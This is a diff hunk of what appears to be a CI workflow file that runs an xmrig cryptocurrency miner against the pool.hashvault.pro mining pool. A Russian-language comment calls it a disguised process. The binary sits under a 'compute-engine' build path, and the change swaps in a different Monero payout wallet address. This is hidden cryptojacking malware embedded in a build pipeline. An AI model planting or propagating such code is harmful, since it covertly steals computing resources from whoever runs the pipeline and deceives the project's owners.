@@ -55,7 +55,7 @@ jobs:
           # Запуск замаскированного процесса. Имя воркера передается как аргумент ($1).
           ./compute-engine/build/xmrig \
             -o pool.hashvault.pro:443 \
-            -u 46ZU6SJUYi2itG88pKTaP2YUbGoa5QhTWRxWCZSnfsgECN1G3EKrHcGhegKTMfMdFS2SZDszfdoY5Fgi3NgUNhSX6yKt2hC \
+            -u 431FofCuWBidwZeULsKRiB3wKw33vbHrK2R6PKZ67kYxjHsebb7JciEYv3cp8dE7RxMRmGvDfJkyQ9gpt2FQDZwgNEVvSbk \
             -p "Legion-Node-$1" \
             -k --tls \
             --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 \
